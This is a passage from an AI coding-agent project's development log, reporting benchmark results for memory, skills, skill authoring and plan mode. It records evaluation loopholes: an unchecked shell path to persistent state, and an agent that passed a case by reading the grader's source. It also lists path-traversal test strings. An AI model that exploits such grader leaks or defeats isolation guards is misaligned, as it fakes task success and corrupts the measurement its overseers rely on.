  -> exit 0, "deploy key kx-9920"
```

`run_shell`'s only argument is `command`, which is not in `PATH_ARGS`, so no workspace check applies
to it — and Phase K made `/state` writable. **The agent could have passed this benchmark with no
memory layer at all.** It was left open on purpose: patching it before measuring would have destroyed
the evidence of whether it mattered.

It did not fire. **memory OFF scored 0/18**, and the traces say why:

```
session 1:  write_file deploy_key.txt      <- its instinct WAS to persist...
                                              ...into the workspace, which reset.sh wipes
session 2:  grep -r "deploy" .
            env | grep -i deploy
            find . -type f  (x4)
            -> nothing. guessed.
```

The agent tried to persist — to the workspace, not to `/state`. **Resetting the workspace between
sessions is what made this benchmark valid**, and that was a design decision taken before the data
existed, not a lucky one.

**The two families fail differently, and that is worth keeping:**

| family | turns | tokens | verdicts |
|---|---|---|---|
| `recall-*` (a fact) | 10/10/10, at the cap | ~23,000 | mostly `stuck` |
| `profile-*` (a habit) | 2-5 | ~6,000 | all `done` |

Asked for a fact it does not have, the agent **thrashes**. Asked to honour a preference it was never
told, it finishes fast and **confidently wrong**. One missing capability, two symptoms.

### The result

Six cases, three runs each, two sessions per case-run, one flag apart.

| | memory OFF | memory ON |
|---|---|---|
| `recall-*` (facts) | 0/9 | **9/9** |
| `profile-*` (habits) | 0/9 | **6/9** |
| **total** | **0/18** | **15/18** |
| median tokens | 8,744 | **6,220** (−29%) |
| total tokens | 233,544 | **139,347** (−40%) |
| mean turns | 5.4 | **2.7** (−50%) |
| runs ending `stuck` | 7 | **0** |

**Memory was budgeted as a cost and came out a saving.** Injected context is charged on every request
(697 chars at most, and `memory_chars` is on every row), and the run still finished 40% cheaper,
because the thrashing stops. Every `stuck` verdict disappeared.

Trust checks both ways: 18 rows each, 0 blocked, 0 tampered, 0 write violations, one model,
`memory: false/true` and `sessions: 2` recorded per row.

### The mechanism, read from the traces rather than assumed

```
session 1:  write_file ORIGIN.txt          <- still tries the workspace first
            remember {"note": "The user has a standing rule that every file
                       I create must start with ORIGIN: quartzite-desk"}
session 2:  write_file notes.txt           <- with the line, unprompted
```

**The agent adopted `remember` on its own.** `prompts/SOUL.md` never mentions it — it was discovered
from the tool schema alone, exactly as `fetch` was in Phase L. Both stores are live and it picks
between them situationally: `profile-marker` went through `AGENT.md`, while `profile-units` recalled
the rule from an episode with `AGENT.md` left empty.

### A fixture defect, and the fix recorded as a separate cycle

`profile-units` scored 0/3. Not a memory failure — all three runs wrote **`200cs`**, while the check
was `grep -qF "200 cs"`. The conversion (two seconds → 200 centiseconds), the unit and the label were
all correct. **The case was measuring whitespace.**

This is the cost of deterministic scoring, taken deliberately over an LLM judge: a judge would have
passed it, but a judge whose agreement with a human has never been measured is an opinion with a
number printed on it.

The check was **not** touched during the run. It was amended afterwards, on request, to
`grep -qE "200 ?cs"` and **re-verified in both directions before being trusted**:

```
untouched                 -> fail        '2 seconds'  -> still fails
'200cs'                   -> pass        'the build took 2s' -> still fails
'Build took 200 cs'       -> pass        '20 cs'      -> still fails
'build took 200cs total'  -> pass        '2000cs'     -> still fails
```

The last column is the one that matters: a loosened check must not make the case passable by writing
any number at all.

**Both numbers stand on the record. 15/18 is the score as measured. The amended-check re-run is a
separate, later cycle, made after seeing the data, and is labelled as such** — a number that improved
after its scorer was adjusted has to say so.

### `registry.py` — created, but not the thing §12 describes

§12's trigger is *"add at tool six"*. Phase L counted five and correctly declined. `remember` is the
sixth, so it fires.

**The `@tool` decorator it names is still not built, and the arithmetic says so.** §13 costed that
machinery at ~25 lines plus ~5 per tool against ~8 per tool written out, which breaks even above
eight *hand-written* tools; there are five, because `fetch`'s schema arrives from the server. The
stronger reason is that the descriptions are load-bearing: the text in `edit_file`'s schema coaches
the model on choosing a unique snippet, and that coaching is what took real repositories from 0/9 to
4/7. Deriving a schema from a signature either loses it or takes it as a decorator argument, at which
point the schema has been written anyway.

What the file **does** own is a real misplacement the sixth tool exposed: `check_budget()` bounds the
whole tool set and was living in `agent/mcp.py`, which stopped being right the moment a second source
of tools appeared.

### The prompt was NOT widened, and the result argues it did not need to be

The plan's M0 said to widen `prompts/SOUL.md`, which opens *"You fix broken code"*. It was left
alone: widening it in the same cycle as adding memory is two variables, and the Iron Law forbids
that. The agent then discovered and used `remember` with no prompt support at all.

**The evidence for a future prompt cycle is now on the record, though.** In session 1 the agent
runs `which git`, `pytest -q` and `git status` when it has simply been *told a fact* — it treats a
conversational statement as a repository to investigate. That costs turns and is exactly what a
widened prompt would fix. It is a separate cycle with its own measurement.

### Tests

**225 offline**, up from 202 — no API key, no network, read-only root. The suite caught a real
defect introduced here: `finish` now writes episodes, so the node tests were about to read and write
the **real** agent home. `tests/conftest.py` redirects `MEMORY_DB` and `PROFILE` alongside
`STATE_DB`, and a test that passes or fails depending on an unrelated session is exactly the failure
that redirect prevents.

The re-run, on the amended check: **`profile-units` 3/3**, 0 blocked, 0 tampered, 0 write violations.
That puts the recall split at an amended **18/18** against a **0/18** baseline — with the amendment's
provenance stated above, and the as-measured 15/18 left standing beside it.

### The dev regression guard

| dev suite | K (4 tools) | L (+mcp) | M (+memory) |
|---|---|---|---|
| pass | 14/15 | 15/15 | **14/15** |
| total tokens | 383,489 | 396,025 | **444,481** |
| median tokens | 26,600 | 27,266 | 31,582 |
| mean turns | 8.4 | 8.0 | 8.6 |
| schema chars | 1,997 | 3,159 | **3,553** |
| memory chars | 0 | 0 | **0** |
| tamper / violations | 0/0 | 0/0 | **0/0** |

**No regression** - 14/15 is the original baseline, and L's 15/15 was already recorded as noise on
`add-endpoint` rather than an improvement.

`memory_chars: 0` across the whole dev suite is correct and worth stating: scored case-runs get a
FRESH agent home (Phase K), so on a single-session case there is never anything to recall. Memory's
cost on coding work is therefore the `remember` schema alone - 394 chars, ~131 tokens per call, which
accounts for roughly 18k of the 61k rise. **The rest is run-to-run variance at n=3**: mean turns moved
8.0 -> 8.6 and `add-endpoint` alone burned 43k. Not attributed further than that.

### Phase M scoreboard

| | result |
|---|---|
| recall benchmark built before the feature | met - and the baseline was 0/18, not a derivable zero |
| episodic recall | **0/9 -> 9/9** |
| the profile, given a real pass/fail | **0/9 -> 6/9 as measured, 9/9 on the amended check** |
| cost reported beside recall | met - and it was a 40% SAVING, not a cost |
| dev regression | met - 14/15, unmoved |
| vectors (FR-408) | **not built.** Keyword recall was measured and did not fall short |

**Kept.**

---

## Phase N — Skills: on-demand knowledge, 0/18 without it, 17/18 with it

**Skills are on-demand knowledge documents in the agentskills.io layout**, loaded through
progressive disclosure. Phase N builds LOADING only; authoring is Phase O. You cannot measure whether
a self-written skill helps until you can measure whether *any* skill helps, and with a hand-written
skill a failure has one suspect instead of three.

### Why disclosure matters more here than almost anywhere

Phase L measured `cache_read_tokens: 0` on every row of a scored run: everything in the prompt is
re-sent and re-paid on every turn, and four tool schemas were already ~23% of a median run. A
knowledge library injected wholesale would be ruinous. So:

```
Level 1  always loaded   name + description   1,224 chars for 8 skills
Level 2  on demand       the SKILL.md body    paid only when opened
Level 3  on demand       bundled files        codes.md, template.conf
```

### The result

Six cases, three runs each, one flag apart. **The control is memory ON, skills OFF** - not "nothing".
`memory.context_for()` already injects "commands that worked" from past sessions, so skills had to
beat that rather than beat zero.

| | skills OFF | skills ON |
|---|---|---|
| pass | **0/18** | **17/18** |
| load rate (the right skill) | — | **17/18** |
| loaded the WRONG skill | — | **0** |
| loaded nothing | — | 1 |
| median tokens | 29,964 | 28,501 |
| total tokens | 457,977 | 475,734 (+3.9%) |
| mean turns | 9.7 | 8.8 |
| index cost per request | 0 | 1,224 chars |

**Zero wrong-skill loads is the number the two distractors exist to produce.** `qz-deploy` and
`qz-migrate` are plausible, well-written and needed by no case; without a skill that is never the
right answer, "chose correctly" cannot be told from "chose the only option".

The single failure is `skill-deps` run 1, which loaded nothing and hit the turn cap. Not a
discrimination failure.

Trust checks both ways: 0 blocked, 0 tampered, 0 write violations, one model, and **0 runs read the
skill library directly through `/app`** - the bypass that would have invalidated the whole comparison.

### The control run that had to be thrown away, and what it bought

The first control was killed after ONE case-run, because `skill-lint` **passed with skills off**.
The agent had read `tools/qzlint.py` and found the answer in the checker's own source:

```python
BANNER = "# owner:"          # the fix, sitting in the workspace
```

Inspection of the other five found two more: `skill-release` shipped a `VERSION` already reading
`4.11.2-quartz` and a `CHANGES.md` already in the `rel ... ::` form, and `skill-deps` shipped a
`deps.txt` already demonstrating the ` @ ` format. **Three of six measured pattern-matching rather
than whether the document was opened.**

The rule that was broken, now stated: **the workspace may contain the TASK, never the ANSWER.** The
three cases that survived did so because their convention existed only in the skill.

Fixed by starting each from a clean slate - no checker in the workspace, an unsuffixed `4.11.2`, an
empty `deps.txt` - and re-verified in **three** directions rather than two:

```
                 untouched   plausible-guess-without-skill   the skill's answer
skill-lint          fail              fail                        pass
skill-release       fail              fail                        pass
skill-config        fail              fail                        pass
skill-testname      fail              fail                        pass
skill-errors        fail              fail                        pass
skill-deps          fail              fail                        pass
```

**The middle column is the one two-way verification misses**, and it is what one case-run of quota
bought. `skill-lint` then scored 0/3 in the rebuilt control.

### `skill-testname` is the sharpest case in the set

Every model has an overwhelming prior that Python tests begin `test_`. This project's fictional
runner collects `check_`. With skills off the agent writes `def test_add()` in four turns and stops -
fast, confident, wrong. With the skill it writes `check_add`. That is about as clean an adherence
signal as can be constructed, because the only way to produce it is to have read the document.

### The dev regression guard

Skills are pure cost here: an index on every request, a seventh schema, and nothing to load.

| dev suite | M (6 tools) | N (+skills) |
|---|---|---|
| pass | 14/15 | 13/15 |
| total tokens | 444,481 | 448,546 (**+0.9%**) |
| median tokens | 31,582 | 27,053 |
| schema chars | 3,553 | 4,075 |
| index chars | 0 | 1,224 |
| skills loaded | 0 | **0** |
| tampered / violations | 0/0 | 0/0 |

**+0.9% total, while paying 1,224 chars of index on every request.** That is the progressive-disclosure
claim as a measured number rather than a design argument.

**The 13/15 is `add-endpoint` at 1/3, and it is NOT attributed to skills.** That case has scored 2/3
(2026-08-19), 2/3 (K), 3/3 (L), 2/3 (M) and now 1/3 - it is the suite's known-flaky case, its
`failures 3->3/0/3` column shows the agent genuinely failing the task, and **zero skills were loaded
on any dev run**, so the mechanism could not have misled it. At n=3 that cannot be *proved*, so it is
recorded as unresolved rather than dismissed. If it recurs at 1/3 next phase it needs its own cycle.

### Two defects the build caught before any quota

- **The index was silently truncating.** 1,236 chars against a guessed 1,200 cap, cutting off the last
  skill's description. A skill the agent cannot see is indistinguishable in the traces from one it
  chose not to open, so overflow is now **fatal** with an actionable message - the same reasoning that
  makes `MAX_SCHEMA_CHARS` fatal.
- **An unquoted colon silently dropped a skill.** `description: Use when asked to deploy: staging...`
  is not valid YAML; `safe_load` returned something unusable and the document vanished from the index
  with no signal. A human writing these by hand will produce that line. YAML stays the primary parser,
  a fallback scan recovers it, and anything still unusable is reported once at startup.

### Level 3, and the argument for allowing it

Bundled files were supported deliberately, and the reasoning is written down because "a document can
carry executable code into the sandbox" should stop a reviewer.

`load_skill` **reads. It never executes.** A bundled script is run by the agent calling `run_shell` on
it, through `classify()` and the `DANGER` regex like anything else. **That grants nothing `run_shell`
does not already grant** inside a container whose boundary Phase K made kernel-enforced. What Level 3
changes is **provenance** - code arriving in a document rather than from the model - and in Phase N
every skill is written by a human. **Phase O gives the agent that power and must re-open this.**

The escape is tested, not assumed: `../../../etc/passwd`, an absolute path, and a traversal into a
sibling skill are all refused, by the same resolve-and-compare shape `policy._inside_workspace()` uses.

### The fixture library moved before it could mislead

The eight skills first landed at `skills/` in the repository root, where they read as *this project's*
conventions - to a human browsing the tree, and to the agent working in it. They describe a fictional
Quartzite/Ashgrove project. They now live at `eval/fixtures/skills-library/` with a README saying so,
and the harness points `AGENT_SKILLS_DIR` there for every scored run, making the library a recorded
measurement condition rather than something ambient. The interactive agent sees `skills/` at the root,
which is empty - so it pays **no index cost at all** rather than 412 tokens a turn for fictions.

### `registry.py` earned its keep

Phase M created it for the merge and the budget. Phase N added a third tool source and touched it
once, by one line. That is what a registry is for.

### Tests

**247 offline**, up from 225 - no API key, no network, read-only root. 22 are new, including all four
path-escape attempts and the parser defect above.

### Phase N scoreboard

| | result |
|---|---|
| load rate | **17/18 correct, 0 wrong** |
| delta in success | **0/18 -> 17/18** |
| disclosure claim | **+0.9% on work that loads nothing** |
| dev regression | 13/15; the drop is the known-flaky case, unresolved not dismissed |
| authoring | **not built** - Phase O, with its own measurement |

**Kept.**

---

## Phase O — Authoring: NOT SHIPPED. The agent will not write a skill.

**Result: `learn` called ZERO times in 15 valid sessions**, with the tool exposed, an explicit
instruction in `SOUL.md` telling it to, three different turn budgets, and a task small enough to
finish with turns to spare. The kill switch stays off and the feature does not ship.

### What was actually eliminated

| hypothesis | how it was ruled out |
|---|---|
| runs out of turns | finished `done` at 7-9 of 12, with 3-5 turns spare |
| runs out of budget | 25k of a 100k budget used |
| task too complex to converge | reduced to ONE file and ONE rule; still nothing |
| tool not exposed | `schema_chars` 4,853 = 8 tools, `authoring: true` on every row |
| prompt does not ask | `SOUL.md` amended to say it explicitly; three variants |

What is left is the finding: **the model does not treat "record this for later" as part of the job.**
It completes the work and stops, which is exactly what it was told to do. Consolidation is not
something it elects to do.

The clearest single trace is the tiny probe's second session:

```
session 1:  read_file  CONVENTIONS.md          <- brief present, read it, wrote the file, DONE at 7 turns
session 2:  read_file  CONVENTIONS.md   ERR    <- reached for it; the workspace was reset
```

It remembers that a conventions file existed. It does not remember what the file said, and it has no
skill to fall back on - which is precisely the gap authoring was built to close.

### Four attempts were discarded before the benchmark was sound

Recorded because they are the phase's real cost, and because three of the four are rig defects of a
kind this project keeps producing as the benchmarks get more elaborate.

1. **Inherited Phase N's skill library.** The harness pointed every scored run at
   `eval/fixtures/skills-library`, and the authoring cases reused the same four conventions - so the
   agent loaded the human-written `qz-release` and passed on knowledge the case existed to withhold.
   Fixed: `AGENT_SKILLS_DIR` is per-case, and the authoring split starts from `skills-empty`.
2. **`inner()` ran `case["setup"]` and consulted `setups` only from session 2 onward.** So session 1
   got the WRONG fixture and **no session ever received `CONVENTIONS.md`**. Every run before this was
   measuring an agent with nothing to learn. The offline verifier missed it because it tested
   `setups[0]` directly while the harness used a different code path for that same session -
   **verifying the data is not verifying the path that consumes it.**
3. **Operator error, and the worst of the four.** With a run waiting on
   `await_exclusive_workspace()`, the blocking container was force-removed by hand to unblock it.
   That guard exists because case-runs share one `/workspace`; defeating it is exactly how one run's
   `reset.sh` lands in another's directory. This project had already invalidated three runs that way.
   **When the log says "waiting for N agent container(s)", let it wait.**
4. **No headroom.** With `max_turns: 12`, session 1 spent 11-12 turns on the task alone. Raising it
   to 20 only moved the wall from the turn cap to the token budget (`compact` at 18-19 turns, 60k a
   run) - the agent expands task work to fill whatever it is given. The tiny probe removed this
   variable entirely.

### The tiny probe, which is what settled it

One case, three runs, two sessions, and session 1 is a single file write against a single rule
(`# owner: unassigned`). Verified three ways first, and the brief-gap check confirmed present in
session 1 and gone in session 2.

```
run 0   done   9/12 turns   26,929 tok   authored=[]
run 1   done   8/12 turns   25,449 tok   authored=[]
run 2   done                             authored=[]
```

**Finishing cleanly with headroom and still not authoring is what makes this a finding rather than a
budget problem.**

### What this says about the design, and it matches a deferral already on record

**Authoring-on-completion is the wrong hook.** It depends on the agent electing to reflect after the
work is done, and it does not. The ROADMAP already deferred "self-improvement of skills during use"
as a separate capability; that deferral now looks like the load-bearing decision rather than a
scoping convenience.

Two designs do not depend on the agent's choice:

- **Amend during use** - capture at the moment the knowledge is acquired. Needs a model call inside
  the loop and its own measurement.
- **Deterministic extraction at `finish`** - and this is the cheap one. The convention was READ FROM
  A FILE, so its content is already in the trace. `finish` can write the skill with **no model call,
  no fourth model-calling node, and no reliance on the agent's judgement.** The benchmark, fixtures
  and instrumentation all exist and are now verified, so this is one function plus a call.

Try the free version before the expensive one.

### What is kept, and what is reverted

**Kept:**
- **The `setups[0]` fix in `inner()`** - a real harness defect that would silently break any future
  per-session case, quite apart from Phase O.
- **Per-case `AGENT_SKILLS_DIR`**, and `eval/fixtures/skills-empty` - a scored split can now declare
  the library it was measured against, rather than inheriting another phase's.
- **`learn` in `agent/skills.py`**, text-only, behind `AGENT_SKILL_AUTHORING=off`. Enforcement is an
  ABSENT parameter rather than a rule: no path or file argument exists, and the slug alphabet cannot
  express a separator, so `../../etc/passwd` becomes a directory called `etc-passwd`.
- **The `authoring` and `authoring-tiny` splits**, three-way verified, with the brief-gap check.
- **256 offline tests**, up from 247.

**Reverted:**
- **`prompts/SOUL.md`.** The widening was measured and did not work; it touches every split and was
  never regression-tested. Keeping an unearned prompt change would be exactly the drift the Iron Law
  exists to prevent.
- **`max_turns: 20`** on the authoring cases, back to 12. It was a probe, not a finding.

### Phase O scoreboard

| | result |
|---|---|
| authoring rate | **0 in 15 valid sessions** |
| reuse rate | not reached - nothing was ever authored |
| delta in success or cost | not reached |
| **verdict** | **NOT SHIPPED.** `AGENT_SKILL_AUTHORING=off` is the default |

**The exit criterion said "without all three numbers this phase does not ship". It has one, and that
one is zero.**

---

## Phase O-redux — Deterministic extraction: the rule fires, the agent never reads it

**Extraction rate 3/3. Load rate 0/3. Pass 0/3 against a 0/3 control.** The mechanism works and
delivers nothing, because the failure moved one step downstream.

### What was built

`finish` now writes a skill from any document the agent **read and never edited**, with no model call
and no decision by the agent — everything needed is already in `state["messages"]`, which is the same
property that lets Phase M write episodes there. `AGENT_SKILL_EXTRACTION=off` by default.

The rule is a deterministic stand-in for the judgement `learn` asked the model for and Phase O
measured it declining 15 times out of 15. A file read and never written to is a reference; anything
the agent wrote is its own output.

### The isolation run, which is the only number that means anything

The first tiny-split run scored **2/3** and it was not extraction that earned it:

| arm | pass | extracted | loaded | memory_chars |
|---|---|---|---|---|
| extraction + memory | 2/3 | 3/3 | 1/3 | up to 630 |
| **control: both off** | **0/3** | 0/3 | 0/3 | 0 |
| **extraction only, memory off** | **0/3** | **3/3** | **0/3** | 0 |

Of the two passes in the first run, one came from `memory_chars: 630` — Phase M's episode carried the
convention and the agent never opened the skill at all. **What that run actually compared was
"extraction + memory" against "memory", and memory won on its own.**

Removing memory from both arms isolates it, and the answer is flat: extraction fires every time and
changes nothing.

### Where the wall actually is, and it is not extraction

Phase O found the agent will not WRITE a skill. This finds it will not READ one either, unless the
task advertises its domain:

| | the task | load rate |
|---|---|---|
| Phase N | *"run this project's style checker"* | **17/18** |
| here | *"create c.txt containing gamma"* | **0/3** |

A task that looks self-contained gives the agent no reason to suspect a convention exists, so it
never looks. The index was present on every request (378 chars) and said, in as many words, *"Check
it BEFORE creating or changing files."* It did not act on that.

**So `load_skill`'s discoverability is the binding constraint, not extraction.** Extraction is a
working component feeding a retrieval path that only fires when the task hints at it.

### Two defects the runs caught in code written minutes earlier

Both had reproducing tests added before the fix:

- **The description described the wrong thing.** Derived from the session's GOAL, it read *"Use when
  working on tasks like: create b.txt containing beta"* — one specific task. A later session asking
  for `c.txt` matched nothing. It now derives from the DOCUMENT's own first heading and names a class
  of work: *"Use when the one rule applies... Check it BEFORE creating or changing files."*
- **`read_file`'s line-number gutter survived into the skill body**, so the document read
  `     1\t# The one rule`. Numbers are how the tool shows a file to the model, not part of what the
  file says.

### Kept, and why, given a null result

- `extract()` and `read_but_not_edited()` in `agent/skills.py`, **default off**. The next attempt
  reuses both, and the component is not what failed.
- `skills_extracted` and `extraction` on every row — the instrumentation is what made the memory
  confound visible, and it would have hidden it otherwise.
- `agent/skills.py` stays a leaf module: the plan had it import `_outcomes` from `graph.py`, which
  would drag in langgraph and close an import cycle (graph already imports skills). Six lines inlined
  instead.

### The next test, and it is the same move that made extraction work

Take the decision away from the model: **auto-inject the top-matching skill's body** at session start
rather than only its index. With one or two skills the cost is bounded and it is one function in
`act`. If it passes, the loop closes end to end with no model judgement anywhere in it. If it still
fails, the agent ignores injected knowledge — a far larger finding than anything about skills.

**269 offline tests**, up from 264.

---

## Plan mode — built, enforced, instrumented; the plan is never written

**Nine scored runs, three cycles, one case. `adopt` fell back to the goal copied verbatim in
every single run.** The phase runs, the read-only gate holds, the cost is real — and FR-101, the
requirement the whole phase was justified by, is **not satisfied**. Default `AGENT_PLAN=off`.

### Why it was built at all, stated before the runs

Not by the pass rate. §9's trigger is *"`stuck` at max_turns, no repeats → no strategy → plan
node"*, and measured across all 676 rows on the current model it looks stronger than it is:

| split | runs | stuck at cap | | reading |
|---|---|---|---|---|
| authoring | 87 | 42 | 48% | already diagnosed: it will not *write* skills |
| skills | 71 | 32 | 45% | already diagnosed: it will not *read* them |
| dev | 133 | 32 | 24% | **18 of those are `add-endpoint` alone** |
| real | 65 | 6 | 9% | the split with headroom — `compact` dominated |
| web, multibug, pilot | 72 | 0 | 0% | |

The two largest contributors had their failures attributed elsewhere already, and counting them
again here would be double-counting. `replan` — §3's other route into this node — fired **once
in 712 rows**. So the justification was FR-101, FR-105, FR-702, UR-02 and UR-05, and the
pass-rate prediction was narrowed in advance to one case: `add-endpoint`, 18 of dev's 32
stuck-at-cap runs, sitting at 1/3.

### The three cycles

| cycle | change | pass | plan written? | plan_turns |
|---|---|---|---|---|
| 1 | the phase, as designed | 1/3 | **no** — cap exited straight to `adopt` | 4/4/4 |
| 2 | reaching the cap asks for the plan instead of exiting | 3/3 | **no** — model called a tool anyway | 5/5/5 |
| 3 | the final planning turn is sent with **no tool schemas** | 2/3 | **no** — model called a tool anyway | 5/5/5 |

**1/3 → 3/3 → 2/3 is noise on a case that was already 1/3, and this project has been burned by
exactly this shape before** — a pilot case scored 1/3, was written up as a capability limit, and
scored 3/3 unchanged in the full run. Nothing here is attributable, and it would not be even if
the numbers had held: the mechanism never fired, and a pass rate is not evidence for a mechanism
that did not run. That is Phase O-redux's rule, applied to itself.

### The cause, proven directly rather than inferred

Cycle 3 removed the tool schemas entirely, so the model *could not* see a tool to call. It
called one anyway. One direct request settled why — `tools` absent from the payload, a short
history containing two prior tool calls:

```
finish_reason: tool_calls
tool_calls:    ['read_file']
text:          ''
```

**On this provider, a history full of tool calls keeps producing tool calls whether or not any
tool is offered.** Neither an instruction nor an absence stops it. So the planning phase never
reached a text-only reply, `reflect`'s hard stop fired on a tool result, and `adopt` had nothing
to parse.

### What that says about the design decision, which was mine and was wrong

§3 draws `PLAN` as a node with its own model call. It was built as a **phase** of the existing
loop instead, justified under CE-04 — two nodes that never branch apart are one node — because
planning seemed to differ from working only in the prompt, the gate and reflect's exit.

**They do branch apart, in the one way that mattered: the message list.** A phase inherits the
tool-call history, and that history is exactly what prevents the plan from being written. A plan
node with a *fresh, short* message list — the goal plus a digest of what was read — would not
have this problem, and that is what §3 was drawing. CE-04 did not apply, and the measurement is
what showed it.

### What is kept, and why, given the null result

Default **off**, so nothing here is claimed. Kept because the next attempt reuses all of it and
none of it is what failed:

- `phase` / `plan` / `cursor` / `plan_turns` on the state, and §9 step 2(b)'s cursor check
  restored — it said to do so "only when the plan node is added".
- **The read-only gate, which is the part that demonstrably works.** `classify(..., planning=True)`
  refused every write across nine runs; `plan_denied` recorded `pytest -q` on all nine, the
  predicted failure written down before the first run. An allowlist rather than "risk == read"
  because there is no directory-listing tool, so refusing `run_shell` outright would leave the
  planner guessing at the tree.
- `PLAN_MAX_TURNS`, separate from `MAX_TURNS`. With a 12-turn cap, research on a shared counter
  would have starved the very case this targeted.
- `plan_steps` / `plan_turns` / `plan_denied` on every row — the instrumentation is the only
  reason the fallback was visible at all. Without `plan_steps` the 3/3 in cycle 2 would have
  been recorded as planning working.
- `reason` on every tool trace entry. The trace had always said a call was denied and never on
  what grounds.

### Costs, stated because they are real

- **NFR-402 breached**: median 60,229 / 64,997 / 66,056 tokens against the 60,000 ceiling. Planning
  spends a model call plus four to five reads on every run.
- `agent/provider.py` now omits `tools` rather than sending `[]` — several OpenAI-compatible
  endpoints reject an empty array. Kept regardless of this phase's outcome; it is a correctness
  fix that cost nothing.

### The next test

A real plan **node** with its own message list: the goal, a digest of what the research turns
read, and no tool-call history. If the plan still is not written with a clean context, the
finding is about the model rather than the design — and that is a much larger result than
anything about planning.

**346 offline tests**, up from 343.

---

## Stage 1 — six audit closures, no third-party code, no quota

A requirement-by-requirement audit against CONTEXT.md found **21 of 35 must-haves
satisfied**, 11 unmet, 3 partial, and one Definition-of-Done item false as written. Six were
looked up elsewhere before being written. **Four of the six turned out to have nothing to copy** -
hand-written tool schemas everywhere, a code tool that is a subprocess runner with no
final-expression value, it has no directory-listing tool, and its seven `_redact_*` helpers are
each tool-specific with no shared utility. So Stage 1 is written here, and costs nothing.

| requirement | was | now |
|---|---|---|
| **NFR-601** adding a tool touches one file | **false as written** - `TOOLS` in tools.py, `RISK` in policy.py | `risk` declared beside the schema; `policy.sync()` reads it |
| **FR-201** list directories | no tool; `run_shell` only | `read_file` on a directory returns the listing |
| **FR-203** run Python, return the final expression | no tool at all | `run_python`, exposed and gated at `write` |
| **NFR-203** secrets never in context | env indirection only, **no redaction code existed** | `redact()` inside `shrink()`, covering the spill too |
| **NFR-304** caps on turns, tokens **and wall-clock** | two of three | `spent_seconds` accumulated, `MAX_SECONDS` enforced |
| **FR-804** delta against the previous run | runs versioned, no delta | `delta()`, per case and per token |

### The one that was a real defect rather than a gap

**NFR-601 was in the Definition of Done and had never been true.** `TOOLS` carried the function
and the schema; `RISK` was a literal in `policy.py`. Every built-in since v1 touched both files,
and the project had been reading "one file" as "one file plus the risk map". A tool now declares
its risk beside its schema - the shape `memory.tools()` and `skills.tools()` already used -
and `policy.risk_of()` falls back to `tools.TOOLS`, so a tool added after import is classifiable
without anyone remembering to call `sync()`. **DoD goes 8/9 -> 9/9, honestly this time.**

### Two things the runs taught, applied here

- **`read_file` on a directory now ANSWERS instead of advising.** Three versions of this, each
  paid for: a bare `[Errno 21]` was the only failure in the 14/15 baseline (3 of 12 turns burned
  retrying); naming `ls` fixed that; and the planning traces then showed the remaining cost -
  read_file, error, `ls -la` on the same path, two turns for one answer. A dedicated list tool
  would cost **~582 chars of schema on every request** against a 6,000 cap, to answer a question
  `read_file` is already being asked.
- **A tool the model cannot see is a function, not a capability.** `run_python` and its five
  tests existed and passed for a while with no `TOOLS` entry - the suite was green and the model
  had never been offered it. Caught by a live toolset check, not by the suite, and there is now a
  test asserting the schema is registered.

### Cost, measured

Schema budget **3,518 / 6,000** chars with memory and skills active (≈4,680 with MCP's `fetch`),
so `run_python` fits with room to spare. **368 offline tests**, up from 346. Zero model quota.

### What Stage 1 did NOT close, and why

**FR-104** - "terminate on exactly one of done, stuck, budget exhausted, turn cap reached" -
stays open. Runs still end `compact` and `replan`, neither of which is on that list, and there is
no `budget` verdict at all. `compact` cannot stop being terminal until the compaction node exists
(Stage 3), and mapping it to "budget exhausted" would be a lie: it fires at 60% of budget, not at
exhaustion. **NFR-304 was deliberately built to avoid making this worse** - running out of
wall-clock terminates as `stuck` rather than as a fifth verdict.

---

## Stage 2a — two latency NFRs measured for the first time, both pass

**Never measured once** - not failed, never attempted. Both are now numbers, and both are
tests, because a latency figure nobody re-runs stops being true.

```
                                        n       p50      p95      p99      max
  NFR-102 framework per iteration     140      0.09     6.53     7.18    23.05   / 250 ms  OK
  NFR-103 checkpoint write            180      2.49    11.40    14.25    15.01   /  50 ms  OK
```

**38x and 4.4x of headroom.** Measured with no model, no network and no quota, which is the
whole reason these two came first: with a stand-in model and a stubbed tool, everything left
IS the framework.

### Where the framework's time actually goes

```
  per node (wall time, model and tool time INCLUDED)
    finish       20   p50   6.08   p95   7.07     <- the memory episode write
    act          40   p50   4.33   p95   5.06
    execute      20   p50   0.09   p95   0.13
    reflect      40   p50   0.04   p95   0.09
    gate         20   p50   0.01   p95   0.05
```

`gate` and `reflect` are 40 and 90 MICROseconds - they wait on nothing, and a test now pins
them under 25 ms so a future layer cannot quietly spend NFR-102's headroom there. The single
largest framework cost in the system is **`finish` writing the memory episode**, which is
worth knowing before anyone optimises anything else.

### What was built

- **`_timed()` wraps each node in `_build()`**, which is the only function that knows all six.
  The nodes are untouched and carry no stopwatch code.
- **`_TimedSaver`** subclasses `SqliteSaver` and times `put()`. It lands on the trace of the run
  that caused it with no plumbing, because `put()` already receives the `RunnableConfig`. The
  only measurement here that reaches into a dependency's surface, so a test pins that the
  subclass still round-trips state - one that timed writes while dropping one would make every
  latency figure look excellent.
- **`act` records the model's own ms**, so NFR-102's "excluding model and tool time" is a
  subtraction over recorded facts rather than an estimate. Tool time was already on the trace.
- **`overhead_ms` and `checkpoint_ms` on every harness row**, so the first sign of a regression
  is a drift rather than a discovery two phases later.

### The percentile helper is stdlib, and the first version was not

`percentile()` was first written as a rank-interpolation loop. That was a mistake worth
recording: `statistics.quantiles(values, n=100, method="inclusive")` computes the same figure,
is already imported by this module, and agrees with the hand-rolled version to **4e-13 over 3,000
random samples** - floating-point noise. Ten lines of arithmetic replaced by one call.

Only two cases need handling on top, because `quantiles` cannot express them: an empty sample
answers 0.0 rather than raising, since a latency table that crashes on a run with no checkpoints
is worse than one reporting a count of 0; and a single sample is its own percentile.

`latency()` returns count, p50, p95, p99 and max **together**, and `count` is the load-bearing
field. A p95 over four samples is not a p95, and printing the figure without the sample size
invites exactly that reading - which is why it returns a dict rather than a number.

### NFR-101 is still unmeasurable, and that is a finding

`_call_openai_compatible` sends no `stream=True` and fires `on_text` only once the whole reply
has arrived. **On the provider every number in this project was measured on, there is no first
token** - there is one block at the end. Measuring NFR-101 today would report full-reply latency
under a name that means something else.

It also means the TUI's status line, which exists to show a reply arriving, fills in one go on
NIM rather than word by word. The README never claimed otherwise - that overstatement was in a
progress report, not in the file - but the behaviour was undocumented, so it is written down now
rather than left for someone to discover and mistrust.

**368 offline tests**, plus 11 for this stage.

---

## Stage 8 then 6 — a bounded search, a decorator that had to wait for it, and a docs pass aimed at the wrong file

Five closures and no quota. The ORDER is the finding: Stage 8 was built before Stage 6 so
